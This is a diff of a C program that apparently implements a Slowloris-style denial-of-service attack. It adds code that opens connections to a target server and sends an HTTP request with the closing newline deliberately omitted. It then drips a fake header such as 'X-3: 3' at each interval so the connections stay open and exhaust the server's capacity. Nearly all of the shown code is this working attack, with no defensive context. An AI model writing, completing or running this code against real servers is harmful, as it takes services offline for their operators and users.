@@ -8,6 +8,7 @@
 #include <signal.h>
 #include <netdb.h>
 #include <arpa/inet.h>
+#include <fcntl.h>
 
 #define BUFFER_LEN 256
 #define MSGTYPE 1
@@ -49,23 +50,36 @@ void send_message(int id, char* message) {
 
 int worker(int id, char* ip, int port, int num_connections, int interval) {
 
-    // create connection
-    // send byte at interval in while true
-    // if lost - reestablish and while again
-
     // define variables
     int socket_fd;
     struct sockaddr_in connect_addr;
+    char byte;
+    int byte_index;
+    int random_fd;
+    char header[9];
+    int header_index = 0;
+
+    // base http request
+    // final newlines are left out so the request would not come to an end
+    char *base_request = \
+        "GET / HTTP/1.0\r\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+        "Accept-Encoding: gzip, deflate, br\r\n"
+        "Connection: keep-alive\r\n"
+        "Keep-Alive: timeout=5, max=100\r\n";
+        // "\r\n\r\n";
 
     // prepare connection
     connect_addr.sin_family = AF_INET;
     connect_addr.sin_port = htons(port);
     inet_aton(ip, &connect_addr.sin_addr.s_addr);
-    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
 
     while (1) {
 
         send_message(id, "attempting to connect to remote host...");
+
+        // init new socket
+        socket_fd = socket(AF_INET, SOCK_STREAM, 0);
 
         // connect to server
         if (connect(socket_fd, (struct sockaddr*)&connect_addr, sizeof(connect_addr)) == -1) {
@@ -75,10 +89,24 @@ int worker(int id, char* ip, int port, int num_connections, int interval) {
 
         send_message(id, "connected to remote host");
 
+        // send initial base request
+        send_message(id, "sending initial headers...");
+        send(socket_fd, base_request, strlen(base_request), 0);
+
+        // header feeding loop
         while (1) {
-            // TODO keep connection
+
+            sleep(interval);
+
+            // send header
+            send_message(id, "sending header...");
+            header_index = (header_index + 1) % 10;
+            sprintf(header, "X-%d: %d\r\n", header_index, header_index);
+            send(socket_fd, header, strlen(header), 0);
         }
 
+        // close previous socket
+        close(socket_fd);
     }
 
     return 1;
